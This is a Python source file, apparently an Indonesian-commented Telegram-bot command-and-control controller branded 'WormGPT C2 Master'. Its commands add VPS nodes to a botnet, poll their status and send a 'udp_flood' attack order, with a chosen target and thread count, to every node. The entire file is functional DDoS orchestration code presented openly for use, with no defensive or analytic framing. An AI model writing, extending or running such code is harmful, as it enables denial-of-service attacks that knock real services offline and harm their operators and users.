# c2_master.py - Master Controller
import telebot
import requests
import json
import threading
import time

# --- KONFIGURASI ---
API_TOKEN = 'MASUKKAN_TELEGRAM_BOT_TOKEN_FARMU_DISINI'
VPS_NODES = []

bot = telebot.TeleBot(API_TOKEN)

def send_command_to_vps(vps_addr, command, payload=None):
 """Mengirim perintah JSON ke Node VPS"""
 url = f"http://{vps_addr}/command"
 data = {"cmd": command}
 if payload:
 data["payload"] = payload
 try:
 r = requests.post(url, json=data, timeout=5)
 return r.status_code == 200
 except Exception:
 return False

@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
 bot.reply_to(message,
 "🚀 WORMGPT C2 MASTER v5.1\n"
 "Mode: L4 UDP AGGRESSIVE\n\n"
 "Ketik perintah ini:\n"
 "/add <IP_VPS:PORT> - Tambahkan Node baru\n"
 "/status - Cek status semua node\n"
 "/attack <target> <threads> - Serang semua node\n"
 "/stop - Hentikan serangan")

@bot.message_handler(commands=['add'])
def add_node(message):
 try:
 parts = message.text.split()
 if len(parts) < 2: return
 ip_port = parts[1]
 VPS_NODES.append(ip_port)
 bot.reply_to(message, f"✅ Node {ip_port} berhasil ditambahkan ke botnet.")
 except Exception as e:
 bot.reply_to(message, f"Error: {e}")

@bot.message_handler(commands=['status'])
def check_status(message):
 if not VPS_NODES:
 bot.reply_to(message, "⚠️ Belum ada node terhubung.")
 return
 
 reply = "📊 STATUS NODE:\n"
 for node in VPS_NODES:
 try:
 r = requests.get(f"http://{node}/status", timeout=2)
 reply += f"- {node}: 🟢 ONLINE ({r.text.strip()})\n"
 except:
 reply += f"- {node}: 🔴 OFFLINE\n"
 bot.reply_to(message, reply)

@bot.message_handler(commands=['attack'])
def initiate_attack(message):
 if not VPS_NODES:
 bot.reply_to(message, "⚠️ Tidak ada node. Gunakan /add.")
 return
 
 args = message.text.split()
 if len(args) < 3:
 bot.reply_to(message, "Format: /attack <target.com> <jumlah_thread>")
 return
 
 target = args[1]
 threads = int(args[2])
 
 payload = {
 "target": target,
 "threads": threads,
 "type": "udp_flood"
 }
 
 msg = f"🔥 INITIATING MASSIVE L4 ATTACK TO {target}...\n"
 msg += f"⚠️ Menggunakan {len(VPS_NODES)} Node Sekaligus.\n"
 msg += f"⚡ Untuk setiap node: {threads} Thread UDP.\n"
 bot.reply_to(message, msg)
 
 # Kirim perintah ke semua node di background
 for node in VPS_NODES:
 send_command_to_vps(node, "start_udp", payload)
 
 time.sleep(2)
 bot.reply_to(message, f"✅ COMMAND SENT TO {len(VPS_NODES)} NODES.")

if __name__ == '__main__':
 print("WormGPT Master C2 Running...")
 bot.infinity_polling()